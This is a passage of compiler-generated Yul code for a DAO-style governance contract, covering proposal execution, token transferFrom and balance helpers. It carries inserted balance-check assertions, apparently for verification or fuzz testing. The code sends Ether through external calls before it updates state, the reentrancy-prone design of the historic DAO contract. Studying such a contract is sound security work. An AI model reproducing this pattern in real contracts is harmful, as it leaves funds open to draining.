                                /// @src 0:35765:35898  "_transactionData.length >= 4 && _transactionData[0] == 0x68..."
                                expr_1741 := expr_1740
                            }
                            /// @src 0:35765:35941  "_transactionData.length >= 4 && _transactionData[0] == 0x68..."
                            let expr_1747 := expr_1741
                            if expr_1747 {
                                /// @src 0:35914:35930  "_transactionData"
                                let _83_mpos := var__transactionData_1609_mpos
                                let expr_1742_mpos := _83_mpos
                                /// @src 0:35931:35932  "3"
                                let expr_1743 := 0x03
                                /// @src 0:35914:35933  "_transactionData[3]"
                                let _84 := read_from_memoryt_bytes1(memory_array_index_access_t_bytes_memory_ptr(expr_1742_mpos, convert_t_rational_3_by_1_to_t_uint256(expr_1743)))
                                let expr_1744 := _84
                                /// @src 0:35937:35941  "0x1e"
                                let expr_1745 := 0x1e
                                /// @src 0:35914:35941  "_transactionData[3] == 0x1e"
                                let expr_1746 := eq(cleanup_t_bytes1(expr_1744), convert_t_rational_30_by_1_to_t_bytes1(expr_1745))
                                /// @src 0:35765:35941  "_transactionData.length >= 4 && _transactionData[0] == 0x68..."
                                expr_1747 := expr_1746
                            }
                            /// @src 0:35765:36021  "_transactionData.length >= 4 && _transactionData[0] == 0x68..."
                            let expr_1761 := expr_1747
                            if expr_1761 {
                                /// @src 0:35957:35963  "quorum"
                                let _85 := var_quorum_1713
                                let expr_1748 := _85
                                /// @src 0:35976:35991  "actualBalance()"
                                let expr_1751 := fun_actualBalance_2833()
                                /// @src 0:35994:36005  "rewardToken"
                                let _86_slot := 0x0d
                                let expr_1752_slot := _86_slot
                                /// @src 0:36014:36018  "this"
                                let expr_1755_address := address()
                                /// @src 0:36006:36019  "address(this)"
                                let expr_1756 := convert_t_contract$_DAO_$3021_to_t_address(expr_1755_address)
                                /// @src 0:35994:36020  "rewardToken[address(this)]"
                                let _87 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_1752_slot,expr_1756)
                                let _88 := read_from_storage_split_offset_0_t_uint256(_87)
                                let expr_1757 := _88
                                /// @src 0:35976:36020  "actualBalance() + rewardToken[address(this)]"
                                let expr_1758 := checked_add_t_uint256(expr_1751, expr_1757)

                                /// @src 0:35966:36021  "minQuorum(actualBalance() + rewardToken[address(this)])"
                                let expr_1759 := fun_minQuorum_2864(expr_1758)
                                /// @src 0:35957:36021  "quorum < minQuorum(actualBalance() + rewardToken[address(this)])"
                                let expr_1760 := lt(cleanup_t_uint256(expr_1748), cleanup_t_uint256(expr_1759))
                                /// @src 0:35765:36021  "_transactionData.length >= 4 && _transactionData[0] == 0x68..."
                                expr_1761 := expr_1760
                            }
                            /// @src 0:35761:36074  "if (_transactionData.length >= 4 && _transactionData[0] == 0x68..."
                            if expr_1761 {
                                /// @src 0:36058:36063  "false"
                                let expr_1763 := 0x00
                                /// @src 0:36042:36063  "proposalCheck = false"
                                var_proposalCheck_1699 := expr_1763
                                let expr_1764 := expr_1763
                                /// @src 0:35761:36074  "if (_transactionData.length >= 4 && _transactionData[0] == 0x68..."
                            }
                            /// @src 0:36088:36094  "quorum"
                            let _89 := var_quorum_1713
                            let expr_1768 := _89
                            /// @src 0:36108:36109  "p"
                            let _90_slot := var_p_1617_slot
                            let expr_1770_slot := _90_slot
                            /// @src 0:36108:36116  "p.amount"
                            let _91 := add(expr_1770_slot, 1)
                            let _92 := read_from_storage_split_offset_0_t_uint256(_91)
                            let expr_1771 := _92
                            /// @src 0:36098:36117  "minQuorum(p.amount)"
                            let expr_1772 := fun_minQuorum_2864(expr_1771)
                            /// @src 0:36088:36117  "quorum >= minQuorum(p.amount)"
                            let expr_1773 := iszero(lt(cleanup_t_uint256(expr_1768), cleanup_t_uint256(expr_1772)))
                            /// @src 0:36084:36418  "if (quorum >= minQuorum(p.amount)) {..."
                            if expr_1773 {
                                /// @src 0:36143:36144  "p"
                                let _93_slot := var_p_1617_slot
                                let expr_1775_slot := _93_slot
                                /// @src 0:36143:36152  "p.creator"
                                let _94 := add(expr_1775_slot, 13)
                                let _95 := read_from_storage_split_offset_0_t_address_payable(_94)
                                let expr_1776 := _95
                                /// @src 0:36143:36157  "p.creator.send"
                                let expr_1777_address := convert_t_address_payable_to_t_address(expr_1776)
                                /// @src 0:36158:36159  "p"
                                let _96_slot := var_p_1617_slot
                                let expr_1778_slot := _96_slot
                                /// @src 0:36158:36175  "p.proposalDeposit"
                                let _97 := add(expr_1778_slot, 6)
                                let _98 := read_from_storage_split_offset_0_t_uint256(_97)
                                let expr_1779 := _98
                                /// @src 0:36143:36176  "p.creator.send(p.proposalDeposit)"

                                let _99 := 0
                                if iszero(expr_1779) { _99 := 2300 }
                                let pbal := balance(address())
                                let expr_1780 := call(_99, expr_1777_address, expr_1779, 0, 0, 0, 0)
                                if lt(balance(address()),pbal) {
                                    ASSERT(eq(sub(pbal,expr_1779) , balance(address())))
                                }

                                /// @src 0:36142:36176  "!p.creator.send(p.proposalDeposit)"
                                let expr_1781 := cleanup_t_bool(iszero(expr_1780))
                                /// @src 0:36141:36177  "(!p.creator.send(p.proposalDeposit))"
                                let expr_1782 := expr_1781
                                /// @src 0:36140:36177  "!(!p.creator.send(p.proposalDeposit))"
                                let expr_1783 := cleanup_t_bool(iszero(expr_1782))
                                /// @src 0:36133:36178  "assert(!(!p.creator.send(p.proposalDeposit)))"
                                assert_helper(expr_1783)
                                /// @src 0:36233:36248  "block.timestamp"
                                let expr_1788 := timestamp()
                                /// @src 0:36210:36248  "lastTimeMinQuorumMet = block.timestamp"
                                update_storage_value_offset_0_t_uint256_to_t_uint256(0x0a, expr_1788)
                                let expr_1789 := expr_1788
                                /// @src 0:36345:36351  "quorum"
                                let _100 := var_quorum_1713
                                let expr_1791 := _100
                                /// @src 0:36354:36365  "totalSupply"
                                let _101 := read_from_storage_split_offset_0_t_uint256(0x07)
                                let expr_1792 := _101
                                /// @src 0:36368:36369  "5"
                                let expr_1793 := 0x05
                                /// @src 0:36354:36369  "totalSupply / 5"
                                let expr_1794 := checked_div_t_uint256(expr_1792, convert_t_rational_5_by_1_to_t_uint256(expr_1793))

                                /// @src 0:36345:36369  "quorum > totalSupply / 5"
                                let expr_1795 := gt(cleanup_t_uint256(expr_1791), cleanup_t_uint256(expr_1794))
                                /// @src 0:36341:36407  "if (quorum > totalSupply / 5)..."
                                if expr_1795 {
                                    /// @src 0:36406:36407  "5"
                                    let expr_1797 := 0x05
                                    /// @src 0:36387:36407  "minQuorumDivisor = 5"
                                    let _102 := convert_t_rational_5_by_1_to_t_uint256(expr_1797)
                                    update_storage_value_offset_0_t_uint256_to_t_uint256(0x09, _102)
                                    let expr_1798 := _102
                                    /// @src 0:36341:36407  "if (quorum > totalSupply / 5)..."
                                }
                                /// @src 0:36084:36418  "if (quorum >= minQuorum(p.amount)) {..."
                            }
                            /// @src 0:36458:36464  "quorum"
                            let _103 := var_quorum_1713
                            let expr_1803 := _103
                            /// @src 0:36478:36479  "p"
                            let _104_slot := var_p_1617_slot
                            let expr_1805_slot := _104_slot
                            /// @src 0:36478:36486  "p.amount"
                            let _105 := add(expr_1805_slot, 1)
                            let _106 := read_from_storage_split_offset_0_t_uint256(_105)
                            let expr_1806 := _106
                            /// @src 0:36468:36487  "minQuorum(p.amount)"
                            let expr_1807 := fun_minQuorum_2864(expr_1806)
                            /// @src 0:36458:36487  "quorum >= minQuorum(p.amount)"
                            let expr_1808 := iszero(lt(cleanup_t_uint256(expr_1803), cleanup_t_uint256(expr_1807)))
                            /// @src 0:36458:36504  "quorum >= minQuorum(p.amount) && p.yea > p.nay"
                            let expr_1814 := expr_1808
                            if expr_1814 {
                                /// @src 0:36491:36492  "p"
                                let _107_slot := var_p_1617_slot
                                let expr_1809_slot := _107_slot
                                /// @src 0:36491:36496  "p.yea"
                                let _108 := add(expr_1809_slot, 9)
                                let _109 := read_from_storage_split_offset_0_t_uint256(_108)
                                let expr_1810 := _109
                                /// @src 0:36499:36500  "p"
                                let _110_slot := var_p_1617_slot
                                let expr_1811_slot := _110_slot
                                /// @src 0:36499:36504  "p.nay"
                                let _111 := add(expr_1811_slot, 10)
                                let _112 := read_from_storage_split_offset_0_t_uint256(_111)
                                let expr_1812 := _112
                                /// @src 0:36491:36504  "p.yea > p.nay"
                                let expr_1813 := gt(cleanup_t_uint256(expr_1810), cleanup_t_uint256(expr_1812))
                                /// @src 0:36458:36504  "quorum >= minQuorum(p.amount) && p.yea > p.nay"
                                expr_1814 := expr_1813
                            }
                            /// @src 0:36458:36521  "quorum >= minQuorum(p.amount) && p.yea > p.nay && proposalCheck"
                            let expr_1816 := expr_1814
                            if expr_1816 {
                                /// @src 0:36508:36521  "proposalCheck"
                                let _113 := var_proposalCheck_1699
                                let expr_1815 := _113
                                /// @src 0:36458:36521  "quorum >= minQuorum(p.amount) && p.yea > p.nay && proposalCheck"
                                expr_1816 := expr_1815
                            }
                            /// @src 0:36454:37259  "if (quorum >= minQuorum(p.amount) && p.yea > p.nay && proposalCheck) {..."
                            if expr_1816 {
                                /// @src 0:36556:36557  "p"
                                let _114_slot := var_p_1617_slot
                                let expr_1819_slot := _114_slot
                                /// @src 0:36556:36567  "p.recipient"
                                let _115 := add(expr_1819_slot, 0)
                                let _116 := read_from_storage_split_offset_0_t_address(_115)
                                let expr_1820 := _116
                                /// @src 0:36556:36572  "p.recipient.call"
                                let expr_1821_address := expr_1820
                                /// @src 0:36580:36581  "p"
                                let _117_slot := var_p_1617_slot
                                let expr_1822_slot := _117_slot
                                /// @src 0:36580:36588  "p.amount"
                                let _118 := add(expr_1822_slot, 1)
                                let _119 := read_from_storage_split_offset_0_t_uint256(_118)
                                let expr_1823 := _119
                                /// @src 0:36556:36589  "p.recipient.call{value: p.amount}"
                                let expr_1824_address := expr_1821_address
                                let expr_1824_value := expr_1823
                                /// @src 0:36590:36606  "_transactionData"
                                let _120_mpos := var__transactionData_1609_mpos
                                let expr_1825_mpos := _120_mpos
                                /// @src 0:36556:36607  "p.recipient.call{value: p.amount}(_transactionData)"

                                let _121 := add(expr_1825_mpos, 0x20)
                                let _122 := mload(expr_1825_mpos)

                                let pbal := balance(address())
                                let expr_1826_component_1 := call(gas(), expr_1824_address,  expr_1824_value,  _121, _122, 0, 0)
                                if lt(balance(address()),pbal) {
                                    ASSERT(eq(sub(pbal,expr_1824_value) , balance(address())))
                                }
                                
                                let expr_1826_component_2_mpos := extract_returndata()
                                /// @src 0:36537:36607  "(bool success, ) = p.recipient.call{value: p.amount}(_transactionData)"
                                let var_success_1818 := expr_1826_component_1
                                /// @src 0:36628:36635  "success"
                                let _123 := var_success_1818
                                let expr_1829 := _123
                                /// @src 0:36621:36636  "assert(success)"
                                assert_helper(expr_1829)
                                /// @src 0:36669:36673  "true"
                                let expr_1835 := 0x01
                                /// @src 0:36650:36651  "p"
                                let _124_slot := var_p_1617_slot
                                let expr_1832_slot := _124_slot
                                /// @src 0:36650:36666  "p.proposalPassed"
                                let _125 := add(expr_1832_slot, 4)
                                /// @src 0:36650:36673  "p.proposalPassed = true"
                                update_storage_value_offset_1_t_bool_to_t_bool(_125, expr_1835)
                                let expr_1836 := expr_1835
                                /// @src 0:36698:36702  "true"
                                let expr_1839 := 0x01
                                /// @src 0:36687:36702  "_success = true"
                                var__success_1613 := expr_1839
                                let expr_1840 := expr_1839
                                /// @src 0:36893:36894  "p"
                                let _126_slot := var_p_1617_slot
                                let expr_1842_slot := _126_slot
                                /// @src 0:36893:36904  "p.recipient"
                                let _127 := add(expr_1842_slot, 0)
                                let _128 := read_from_storage_split_offset_0_t_address(_127)
                                let expr_1843 := _128
                                /// @src 0:36916:36920  "this"
                                let expr_1846_address := address()
                                /// @src 0:36908:36921  "address(this)"
                                let expr_1847 := convert_t_contract$_DAO_$3021_to_t_address(expr_1846_address)
                                /// @src 0:36893:36921  "p.recipient != address(this)"
                                let expr_1848 := iszero(eq(cleanup_t_address(expr_1843), cleanup_t_address(expr_1847)))
                                /// @src 0:36893:36962  "p.recipient != address(this) && p.recipient != address(rewardAccount)"
                                let expr_1856 := expr_1848
                                if expr_1856 {
                                    /// @src 0:36925:36926  "p"
                                    let _129_slot := var_p_1617_slot
                                    let expr_1849_slot := _129_slot
                                    /// @src 0:36925:36936  "p.recipient"
                                    let _130 := add(expr_1849_slot, 0)
                                    let _131 := read_from_storage_split_offset_0_t_address(_130)
                                    let expr_1850 := _131
                                    /// @src 0:36948:36961  "rewardAccount"
                                    let _132_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x0f)
                                    let expr_1853_address := _132_address
                                    /// @src 0:36940:36962  "address(rewardAccount)"
                                    let expr_1854 := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_1853_address)
                                    /// @src 0:36925:36962  "p.recipient != address(rewardAccount)"
                                    let expr_1855 := iszero(eq(cleanup_t_address(expr_1850), cleanup_t_address(expr_1854)))
                                    /// @src 0:36893:36962  "p.recipient != address(this) && p.recipient != address(rewardAccount)"
                                    expr_1856 := expr_1855
                                }
                                /// @src 0:36893:37022  "p.recipient != address(this) && p.recipient != address(rewardAccount)..."
                                let expr_1864 := expr_1856
                                if expr_1864 {
                                    /// @src 0:36982:36983  "p"
                                    let _133_slot := var_p_1617_slot
                                    let expr_1857_slot := _133_slot
                                    /// @src 0:36982:36993  "p.recipient"
                                    let _134 := add(expr_1857_slot, 0)
                                    let _135 := read_from_storage_split_offset_0_t_address(_134)
                                    let expr_1858 := _135
                                    /// @src 0:37005:37021  "DAOrewardAccount"
                                    let _136_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x10)
                                    let expr_1861_address := _136_address
                                    /// @src 0:36997:37022  "address(DAOrewardAccount)"
                                    let expr_1862 := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_1861_address)
                                    /// @src 0:36982:37022  "p.recipient != address(DAOrewardAccount)"
                                    let expr_1863 := iszero(eq(cleanup_t_address(expr_1858), cleanup_t_address(expr_1862)))
                                    /// @src 0:36893:37022  "p.recipient != address(this) && p.recipient != address(rewardAccount)..."
                                    expr_1864 := expr_1863
                                }
                                /// @src 0:36893:37078  "p.recipient != address(this) && p.recipient != address(rewardAccount)..."
                                let expr_1872 := expr_1864
                                if expr_1872 {
                                    /// @src 0:37042:37043  "p"
                                    let _137_slot := var_p_1617_slot
                                    let expr_1865_slot := _137_slot
                                    /// @src 0:37042:37053  "p.recipient"
                                    let _138 := add(expr_1865_slot, 0)
                                    let _139 := read_from_storage_split_offset_0_t_address(_138)
                                    let expr_1866 := _139
                                    /// @src 0:37065:37077  "extraBalance"
                                    let _140_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x03)
                                    let expr_1869_address := _140_address
                                    /// @src 0:37057:37078  "address(extraBalance)"
                                    let expr_1870 := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_1869_address)
                                    /// @src 0:37042:37078  "p.recipient != address(extraBalance)"
                                    let expr_1871 := iszero(eq(cleanup_t_address(expr_1866), cleanup_t_address(expr_1870)))
                                    /// @src 0:36893:37078  "p.recipient != address(this) && p.recipient != address(rewardAccount)..."
                                    expr_1872 := expr_1871
                                }
                                /// @src 0:36893:37129  "p.recipient != address(this) && p.recipient != address(rewardAccount)..."
                                let expr_1880 := expr_1872
                                if expr_1880 {
                                    /// @src 0:37098:37099  "p"
                                    let _141_slot := var_p_1617_slot
                                    let expr_1873_slot := _141_slot
                                    /// @src 0:37098:37109  "p.recipient"
                                    let _142 := add(expr_1873_slot, 0)
                                    let _143 := read_from_storage_split_offset_0_t_address(_142)
                                    let expr_1874 := _143
                                    /// @src 0:37121:37128  "curator"
                                    let _144 := read_from_storage_split_offset_0_t_address(0x0b)
                                    let expr_1877 := _144
                                    /// @src 0:37113:37129  "address(curator)"
                                    let expr_1878 := expr_1877
                                    /// @src 0:37098:37129  "p.recipient != address(curator)"
                                    let expr_1879 := iszero(eq(cleanup_t_address(expr_1874), cleanup_t_address(expr_1878)))
                                    /// @src 0:36893:37129  "p.recipient != address(this) && p.recipient != address(rewardAccount)..."
                                    expr_1880 := expr_1879
                                }
                                /// @src 0:36889:37249  "if (p.recipient != address(this) && p.recipient != address(rewardAccount)..."
                                if expr_1880 {
                                    /// @src 0:37180:37181  "p"
                                    let _145_slot := var_p_1617_slot
                                    let expr_1887_slot := _145_slot
                                    /// @src 0:37180:37188  "p.amount"
                                    let _146 := add(expr_1887_slot, 1)
                                    let _147 := read_from_storage_split_offset_0_t_uint256(_146)
                                    let expr_1888 := _147
                                    /// @src 0:37150:37161  "rewardToken"
                                    let _148_slot := 0x0d
                                    let expr_1881_slot := _148_slot
                                    /// @src 0:37170:37174  "this"
                                    let expr_1884_address := address()
                                    /// @src 0:37162:37175  "address(this)"
                                    let expr_1885 := convert_t_contract$_DAO_$3021_to_t_address(expr_1884_address)
                                    /// @src 0:37150:37176  "rewardToken[address(this)]"
                                    let _149 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_1881_slot,expr_1885)
                                    /// @src 0:37150:37188  "rewardToken[address(this)] += p.amount"
                                    let _150 := read_from_storage_split_offset_0_t_uint256(_149)
                                    let expr_1889 := checked_add_t_uint256(_150, expr_1888)

                                    update_storage_value_offset_0_t_uint256_to_t_uint256(_149, expr_1889)
                                    /// @src 0:37226:37227  "p"
                                    let _151_slot := var_p_1617_slot
                                    let expr_1892_slot := _151_slot
                                    /// @src 0:37226:37234  "p.amount"
                                    let _152 := add(expr_1892_slot, 1)
                                    let _153 := read_from_storage_split_offset_0_t_uint256(_152)
                                    let expr_1893 := _153
                                    /// @src 0:37206:37234  "totalRewardToken += p.amount"
                                    let _154 := read_from_storage_split_offset_0_t_uint256(0x0e)
                                    let expr_1894 := checked_add_t_uint256(_154, expr_1893)

                                    update_storage_value_offset_0_t_uint256_to_t_uint256(0x0e, expr_1894)
                                    /// @src 0:36889:37249  "if (p.recipient != address(this) && p.recipient != address(rewardAccount)..."
                                }
                                /// @src 0:36454:37259  "if (quorum >= minQuorum(p.amount) && p.yea > p.nay && proposalCheck) {..."
                            }
                            /// @src 0:37283:37294  "_proposalID"
                            let _155 := var__proposalID_1607
                            let expr_1901 := _155
                            fun_closeProposal_1938(expr_1901)
                            /// @src 0:37353:37364  "_proposalID"
                            let _156 := var__proposalID_1607
                            let expr_1905 := _156
                            /// @src 0:37366:37374  "_success"
                            let _157 := var__success_1613
                            let expr_1906 := _157
                            /// @src 0:37376:37382  "quorum"
                            let _158 := var_quorum_1713
                            let expr_1907 := _158
                            /// @src 0:37337:37383  "ProposalTallied(_proposalID, _success, quorum)"
                            let _159 := 0xdfc78bdca8e3e0b18c16c5c99323c6cb9eb5e00afde190b4e7273f5158702b07
                            let _160 := convert_t_uint256_to_t_uint256(expr_1905)
                            {
                                let _161 := allocate_unbounded()
                                let _162 := abi_encode_tuple_t_bool_t_uint256__to_t_bool_t_uint256__fromStack(_161 , expr_1906, expr_1907)
                                log2(_161, sub(_162, _161) , _159, _160)
                            }
                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 222
                        /// @src 0:4356:4878  "function transferFrom(..."
                        function fun_transferFrom_222(var__from_159, var__to_161, var__amount_163) -> var_success_167 {
                            /// @src 0:4478:4490  "bool success"
                            let zero_t_bool_163 := zero_value_for_split_t_bool()
                            var_success_167 := zero_t_bool_163

                            /// @src 0:4507:4515  "balances"
                            let _164_slot := 0x05
                            let expr_169_slot := _164_slot
                            /// @src 0:4516:4521  "_from"
                            let _165 := var__from_159
                            let expr_170 := _165
                            /// @src 0:4507:4522  "balances[_from]"
                            let _166 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_169_slot,expr_170)
                            let _167 := read_from_storage_split_offset_0_t_uint256(_166)
                            let expr_171 := _167
                            /// @src 0:4526:4533  "_amount"
                            let _168 := var__amount_163
                            let expr_172 := _168
                            /// @src 0:4507:4533  "balances[_from] >= _amount"
                            let expr_173 := iszero(lt(cleanup_t_uint256(expr_171), cleanup_t_uint256(expr_172)))
                            /// @src 0:4507:4586  "balances[_from] >= _amount..."
                            let expr_182 := expr_173
                            if expr_182 {
                                /// @src 0:4549:4556  "allowed"
                                let _169_slot := 0x06
                                let expr_174_slot := _169_slot
                                /// @src 0:4557:4562  "_from"
                                let _170 := var__from_159
                                let expr_175 := _170
                                /// @src 0:4549:4563  "allowed[_from]"
                                let _171 := mapping_index_access_t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$_of_t_address(expr_174_slot,expr_175)
                                let _172_slot := _171
                                let expr_176_slot := _172_slot
                                /// @src 0:4564:4574  "msg.sender"
                                let expr_178 := caller()
                                /// @src 0:4549:4575  "allowed[_from][msg.sender]"
                                let _173 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_176_slot,expr_178)
                                let _174 := read_from_storage_split_offset_0_t_uint256(_173)
                                let expr_179 := _174
                                /// @src 0:4579:4586  "_amount"
                                let _175 := var__amount_163
                                let expr_180 := _175
                                /// @src 0:4549:4586  "allowed[_from][msg.sender] >= _amount"
                                let expr_181 := iszero(lt(cleanup_t_uint256(expr_179), cleanup_t_uint256(expr_180)))
                                /// @src 0:4507:4586  "balances[_from] >= _amount..."
                                expr_182 := expr_181
                            }
                            /// @src 0:4507:4613  "balances[_from] >= _amount..."
                            let expr_186 := expr_182
                            if expr_186 {
                                /// @src 0:4602:4609  "_amount"
                                let _176 := var__amount_163
                                let expr_183 := _176
                                /// @src 0:4612:4613  "0"
                                let expr_184 := 0x00
                                /// @src 0:4602:4613  "_amount > 0"
                                let expr_185 := gt(cleanup_t_uint256(expr_183), convert_t_rational_0_by_1_to_t_uint256(expr_184))
                                /// @src 0:4507:4613  "balances[_from] >= _amount..."
                                expr_186 := expr_185
                            }
                            /// @src 0:4503:4872  "if (balances[_from] >= _amount..."
                            switch expr_186
                            case 0 {
                                /// @src 0:4856:4861  "false"
                                let expr_217 := 0x00
                                /// @src 0:4849:4861  "return false"
                                var_success_167 := expr_217
                                leave
                                /// @src 0:4503:4872  "if (balances[_from] >= _amount..."
                            }
                            default {
                                /// @src 0:4647:4654  "_amount"
                                let _177 := var__amount_163
                                let expr_190 := _177
                                /// @src 0:4630:4638  "balances"
                                let _178_slot := 0x05
                                let expr_187_slot := _178_slot
                                /// @src 0:4639:4642  "_to"
                                let _179 := var__to_161
                                let expr_188 := _179
                                /// @src 0:4630:4643  "balances[_to]"
                                let _180 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_187_slot,expr_188)
                                /// @src 0:4630:4654  "balances[_to] += _amount"
                                let _181 := read_from_storage_split_offset_0_t_uint256(_180)
                                let expr_191 := checked_add_t_uint256(_181, expr_190)

                                update_storage_value_offset_0_t_uint256_to_t_uint256(_180, expr_191)
                                /// @src 0:4687:4694  "_amount"
                                let _182 := var__amount_163
                                let expr_196 := _182
                                /// @src 0:4668:4676  "balances"
                                let _183_slot := 0x05
                                let expr_193_slot := _183_slot
                                /// @src 0:4677:4682  "_from"
                                let _184 := var__from_159
                                let expr_194 := _184
                                /// @src 0:4668:4683  "balances[_from]"
                                let _185 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_193_slot,expr_194)
                                /// @src 0:4668:4694  "balances[_from] -= _amount"
                                let _186 := read_from_storage_split_offset_0_t_uint256(_185)
                                let expr_197 := checked_sub_t_uint256(_186, expr_196)

                                update_storage_value_offset_0_t_uint256_to_t_uint256(_185, expr_197)
                                /// @src 0:4738:4745  "_amount"
                                let _187 := var__amount_163
                                let expr_205 := _187
                                /// @src 0:4708:4715  "allowed"
                                let _188_slot := 0x06
                                let expr_199_slot := _188_slot
                                /// @src 0:4716:4721  "_from"
                                let _189 := var__from_159
                                let expr_200 := _189
                                /// @src 0:4708:4722  "allowed[_from]"
                                let _190 := mapping_index_access_t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$_of_t_address(expr_199_slot,expr_200)
                                let _191_slot := _190
                                let expr_203_slot := _191_slot
                                /// @src 0:4723:4733  "msg.sender"
                                let expr_202 := caller()
                                /// @src 0:4708:4734  "allowed[_from][msg.sender]"
                                let _192 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_203_slot,expr_202)
                                /// @src 0:4708:4745  "allowed[_from][msg.sender] -= _amount"
                                let _193 := read_from_storage_split_offset_0_t_uint256(_192)
                                let expr_206 := checked_sub_t_uint256(_193, expr_205)

                                update_storage_value_offset_0_t_uint256_to_t_uint256(_192, expr_206)
                                /// @src 0:4773:4778  "_from"
                                let _194 := var__from_159
                                let expr_209 := _194
                                /// @src 0:4780:4783  "_to"
                                let _195 := var__to_161
                                let expr_210 := _195
                                /// @src 0:4785:4792  "_amount"
                                let _196 := var__amount_163
                                let expr_211 := _196
                                /// @src 0:4764:4793  "Transfer(_from, _to, _amount)"
                                let _197 := 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
                                let _198 := convert_t_address_to_t_address(expr_209)
                                let _199 := convert_t_address_to_t_address(expr_210)
                                {
                                    let _200 := allocate_unbounded()
                                    let _201 := abi_encode_tuple_t_uint256__to_t_uint256__fromStack(_200 , expr_211)
                                    log3(_200, sub(_201, _200) , _197, _198, _199)
                                }/// @src 0:4814:4818  "true"
                                let expr_214 := 0x01
                                /// @src 0:4807:4818  "return true"
                                var_success_167 := expr_214
                                leave
                                /// @src 0:4503:4872  "if (balances[_from] >= _amount..."
                            }

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 3020
                        /// @src 0:46943:47040  "function unblockMe() public override returns (bool) {..."
                        function fun_unblockMe_3020() -> var__3012 {
                            /// @src 0:46989:46993  "bool"
                            let zero_t_bool_202 := zero_value_for_split_t_bool()
                            var__3012 := zero_t_bool_202

                            /// @src 0:47022:47032  "msg.sender"
                            let expr_3016 := caller()
                            /// @src 0:47012:47033  "isBlocked(msg.sender)"
                            let expr_3017 := fun_isBlocked_3008(expr_3016)
                            /// @src 0:47005:47033  "return isBlocked(msg.sender)"
                            var__3012 := expr_3017
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 2833
                        /// @src 0:44940:45076  "function actualBalance() public view returns (uint _actualBalance) {..."
                        function fun_actualBalance_2833() -> var__actualBalance_2822 {
                            /// @src 0:44986:45005  "uint _actualBalance"
                            let zero_t_uint256_203 := zero_value_for_split_t_uint256()
                            var__actualBalance_2822 := zero_t_uint256_203

                            /// @src 0:45032:45036  "this"
                            let expr_2826_address := address()
                            /// @src 0:45024:45037  "address(this)"
                            let expr_2827 := convert_t_contract$_DAO_$3021_to_t_address(expr_2826_address)
                            /// @src 0:45024:45045  "address(this).balance"
                            let expr_2828 := balance(expr_2827)
                            /// @src 0:45048:45069  "sumOfProposalDeposits"
                            let _204 := read_from_storage_split_offset_0_t_uint256(0x15)
                            let expr_2829 := _204
                            /// @src 0:45024:45069  "address(this).balance - sumOfProposalDeposits"
                            let expr_2830 := checked_sub_t_uint256(expr_2828, expr_2829)

                            /// @src 0:45017:45069  "return address(this).balance - sumOfProposalDeposits"
                            var__actualBalance_2822 := expr_2830
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 2599
                        /// @src 0:42676:42851  "function transferWithoutReward(address _to, uint256 _value) public override returns (bool success) {..."
                        function fun_transferWithoutReward_2599(var__to_2580, var__value_2582) -> var_success_2586 {
                            /// @src 0:42761:42773  "bool success"
                            let zero_t_bool_205 := zero_value_for_split_t_bool()
                            var_success_2586 := zero_t_bool_205

                            /// @src 0:42792:42805  "getMyReward()"
                            let expr_2590 := fun_getMyReward_2473()
                            /// @src 0:42785:42806  "assert(getMyReward())"
                            assert_helper(expr_2590)
                            /// @src 0:42832:42835  "_to"
                            let _206 := var__to_2580
                            let expr_2594 := _206
                            /// @src 0:42837:42843  "_value"
                            let _207 := var__value_2582
                            let expr_2595 := _207
                            /// @src 0:42823:42844  "transfer(_to, _value)"
                            let expr_2596 := fun_transfer_157(expr_2594, expr_2595)
                            /// @src 0:42816:42844  "return transfer(_to, _value)"
                            var_success_2586 := expr_2596
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function revert_error_0cc013b6b3b6beabea4e3a74a6d380f0df81852ca99887912475e1f66b2a2c20() {
                            revert(0, 0)
                        }

                        function shift_left_224(value) -> newValue {
                            newValue :=

                            shl(224, value)

                        }

                        function abi_decode_t_uint256_fromMemory(offset, end) -> value {
                            value := mload(offset)
                            validator_revert_t_uint256(value)
                        }

                        function abi_decode_tuple_t_uint256_fromMemory(headStart, dataEnd) -> value0 {
                            if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_uint256_fromMemory(add(headStart, offset), dataEnd)
                            }

                        }

                        function convert_t_contract$_TokenCreation_$695_to_t_address(value) -> converted {
                            converted := convert_t_uint160_to_t_address(value)
                        }

                        function abi_decode_t_bool_fromMemory(offset, end) -> value {
                            value := mload(offset)
                            validator_revert_t_bool(value)
                        }

                        function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {
                            if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)
                            }

                        }

                        function abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack(headStart , value0, value1) -> tail {
                            tail := add(headStart, 64)

